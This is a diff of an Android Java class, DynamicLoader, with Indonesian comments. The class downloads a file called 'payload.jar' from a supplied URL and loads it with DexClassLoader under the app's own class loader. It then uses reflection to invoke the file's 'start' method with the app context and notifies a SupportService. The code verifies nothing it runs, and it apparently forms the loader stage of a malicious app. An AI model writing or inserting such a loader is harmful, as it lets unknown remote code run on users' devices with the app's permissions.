@@ -15,14 +15,12 @@ public class DynamicLoader {
 
     public static void fetchAndExecute(Context context, String jarUrl, final String classNameInput) {
         new Thread(() -> {
-            String className = classNameInput;
             try {
-                // 1. Siapkan lokasi penyimpanan di folder internal (aman)
                 File internalDir = new File(context.getFilesDir(), "modules");
                 if (!internalDir.exists()) internalDir.mkdirs();
                 File jarFile = new File(internalDir, "payload.jar");
 
-                // 2. Download file JAR dari server
+                // Download only if needed or if requested
                 Log.d(TAG, "Downloading payload from: " + jarUrl);
                 URL url = new URL(jarUrl);
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
@@ -34,41 +32,51 @@ public class DynamicLoader {
                         fos.write(buffer, 0, read);
                     }
                 }
-
-                // 3. Muat file DEX menggunakan DexClassLoader
-                Log.d(TAG, "Loading DEX from: " + jarFile.getAbsolutePath() + " (Size: " + jarFile.length() + " bytes)");
                 
-                // Fix typos in class name if not already fixed in caller
-                if (className.endsWith(".PayloadEntery") || className.endsWith(".PayloadEmtry")) {
-                    className = className.substring(0, className.lastIndexOf(".")) + ".PayloadEntry";
-                }
+                loadLocal(context, classNameInput);
 
-                // Gunakan class loader APK sebagai parent agar payload bisa mengakses class di APK utama
-                DexClassLoader loader = new DexClassLoader(
-                    jarFile.getAbsolutePath(),
-                    internalDir.getAbsolutePath(), // optimizedDirectory
-                    null,
-                    context.getClassLoader()
-                );
-
-                // 4. Jalankan class dan method tertentu menggunakan Reflection
-                Log.d(TAG, "Searching for class: " + className);
-                Class<?> clazz = loader.loadClass(className);
-                Log.d(TAG, "Class found! Instantiating...");
-                Object instance = clazz.newInstance();
-                
-                // Asumsikan payload memiliki method "start" yang menerima Context
-                Log.d(TAG, "Invoking 'start' method...");
-                clazz.getMethod("start", Context.class).invoke(instance, context);
-                
-                Log.i(TAG, "Dynamic Payload started successfully!");
-
-            } catch (ClassNotFoundException e) {
-                Log.e(TAG, "Critical Error: Class " + className + " not found in JAR!");
             } catch (Exception e) {
-                Log.e(TAG, "Failed to load dynamic payload: " + e.toString());
-                e.printStackTrace();
+                Log.e(TAG, "Failed to download and load payload: " + e.toString());
             }
         }).start();
+    }
+
+    public static void loadLocal(Context context, String classNameInput) {
+        try {
+            File internalDir = new File(context.getFilesDir(), "modules");
+            File jarFile = new File(internalDir, "payload.jar");
+
+            if (!jarFile.exists()) {
+                Log.e(TAG, "Local payload file not found at: " + jarFile.getAbsolutePath());
+                return;
+            }
+
+            Log.d(TAG, "Loading local DEX from: " + jarFile.getAbsolutePath());
+            
+            String className = classNameInput;
+            if (className.endsWith(".PayloadEntery") || className.endsWith(".PayloadEmtry")) {
+                className = className.substring(0, className.lastIndexOf(".")) + ".PayloadEntry";
+            }
+
+            DexClassLoader loader = new DexClassLoader(
+                jarFile.getAbsolutePath(),
+                internalDir.getAbsolutePath(),
+                null,
+                context.getClassLoader()
+            );
+
+            Class<?> clazz = loader.loadClass(className);
+            Object instance = clazz.newInstance();
+            clazz.getMethod("start", Context.class).invoke(instance, context);
+            
+            Log.i(TAG, "Local Payload started successfully!");
+
+            if (context instanceof SupportService) {
+                ((SupportService) context).updateSystemStatus();
+            }
+
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to load local payload: " + e.toString());
+        }
     }
 }
